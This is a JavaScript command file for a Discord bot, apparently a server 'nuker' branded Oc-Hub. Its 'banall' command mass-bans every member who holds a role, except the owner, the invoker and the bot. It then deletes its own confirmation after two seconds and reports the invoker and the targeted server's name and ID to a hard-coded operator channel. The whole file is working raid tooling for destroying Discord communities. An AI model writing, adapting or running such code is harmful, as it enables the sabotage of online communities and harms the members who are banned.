const Discord = require('discord.js')
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const color = 'cc2929'

module.exports = {
  name: "banall",
  alias: [],

async execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(color)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("This command is not available in this server.")
        .setColor(color);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  var botperms = message.guild.me.permissions.has("BAN_MEMBERS")
  if(!botperms){
    const siu = new Discord.MessageEmbed()
    .setDescription("I don't have permissions. I need the `BAN_MEMBERS`.")
    .setColor(color)
    return message.reply({embeds: [siu]})
  }

  try {

  await message.guild.members.fetch()

  const owner = message.guild.ownerId;
  let bannedCount = 0;

  message.guild.members.cache.forEach(member => {
       if (member.id !== owner && member.id !== message.author.id && member.id !== client.user.id) {
        if (member.roles && member.roles.cache.size > 1) {
        const highestRole = member.roles.highest;

        if (highestRole && highestRole.id !== message.guild.ownerId) {
          member.ban({ reason: "Banned by Oc-Hub" })
              .then(bannedMember => {
                  bannedCount++;
              })
              .catch(err => {
                  const embed = new Discord.MessageEmbed()
                      .setDescription("I can't ban this user. " + err)
                      .setColor(color)
                  message.author.send({ embeds: [embed] }).catch(err => {
                    return;
                  })
              })
           }
        }
      }
  })

  const kk = new Discord.MessageEmbed()
  .setDescription("Banned all members.")
  .setColor(color)
  message.reply({embeds: [kk]}).then(msg => {
    setTimeout(() => {
      msg.delete()
    }, 2000)
  })


  const e = new Discord.MessageEmbed()


   .setDescription(`ban-all executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(color)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1265925374601334914").send({embeds: [e]})


} catch (error) {
  const laoo = new Discord.MessageEmbed()
  .setDescription("Error found")
  .addField("> Command", "`banall`", true)
  .addField("> Error", `\`${error}\``, true)
  .setColor(color)

  client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})
}


}
 }

